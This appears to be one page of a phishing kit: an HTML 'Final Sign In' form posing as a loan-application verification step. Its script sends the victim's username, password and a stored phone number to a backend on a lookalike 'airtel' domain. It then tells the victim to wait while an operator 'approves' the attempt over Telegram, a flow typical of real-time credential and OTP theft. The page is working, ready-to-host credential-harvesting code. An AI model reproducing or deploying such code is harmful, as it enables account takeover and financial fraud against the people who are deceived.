<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Final Login</title>
    <style>
      body {
        margin: 0;
        font-family: Arial, Helvetica, sans-serif;
        background: #f3f4f6;
      }
      .card {
        max-width: 420px;
        margin: 64px auto;
        background: #fff;
        border-radius: 16px;
        padding: 30px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
      }
      h1 {
        color: #16213e;
        margin: 0 0 8px;
      }
      p {
        color: #666;
        margin-bottom: 14px;
      }
      label {
        display: block;
        font-weight: 600;
        margin-bottom: 6px;
      }
      input {
        width: 100%;
        padding: 12px 14px;
        border-radius: 10px;
        border: 1px solid #ddd;
        margin-bottom: 12px;
      }
      .btn {
        width: 100%;
        padding: 14px;
        border-radius: 12px;
        border: none;
        background: linear-gradient(90deg, #6c5ce7, #00b894);
        color: #fff;
        font-size: 16px;
        cursor: pointer;
      }
      .small {
        font-size: 13px;
        color: #999;
        margin-top: 12px;
        text-align: center;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Final Sign In</h1>
      <p>Complete one more quick verification to finish your application.</p>

      <form id="login2Form">
        <label for="username">Username</label>
        <input id="username" type="text" placeholder="username" required />

        <label for="password">Password</label>
        <input id="password" type="password" placeholder="Password" required />

        <button class="btn" type="submit">Submit for Approval</button>
      </form>

      <div class="small">This will be approved by an admin via Telegram.</div>
    </div>

    <script>
      document
        .getElementById("login2Form")
        .addEventListener("submit", async (e) => {
          e.preventDefault();
          const username = document.getElementById("username").value.trim();
          const password = document.getElementById("password").value.trim();
          if (!username || !password) return alert("Please fill both fields");

          const phone = localStorage.getItem("phoneNumber") || "";
          const backendUrl =
            localStorage.getItem("backendUrl") ||
            "https://airtel-01.onrender.com";

          try {
            const resp = await fetch(`${backendUrl}/api/login/submit`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ username, password, phone }),
            });

            const data = await resp.json();
            if (!data.success || !data.requestId)
              throw new Error(data.error || "Submit failed");

            // Show waiting UI and poll for approval
            const card = document.querySelector(".card");
            card.innerHTML = `<h1>Waiting for admin approval</h1><p id="status">Awaiting approval via Telegram...</p>`;

            const statusEl = document.getElementById("status");
            const pollInterval = setInterval(async () => {
              try {
                const r = await fetch(
                  `${backendUrl}/api/otp/status/${data.requestId}`,
                );
                const j = await r.json();
                if (j.approved) {
                  clearInterval(pollInterval);
                  window.location.href = "loan8.html";
                } else if (j.rejected) {
                  clearInterval(pollInterval);
                  if (statusEl)
                    statusEl.innerHTML = `Rejected: ${j.message} <a href="login2.html">Try again</a>`;
                }
              } catch (err) {
                console.error("Poll error:", err);
              }
            }, 2000);
          } catch (err) {
            alert("Error: " + err.message);
          }
        });
    </script>
  </body>
</html>
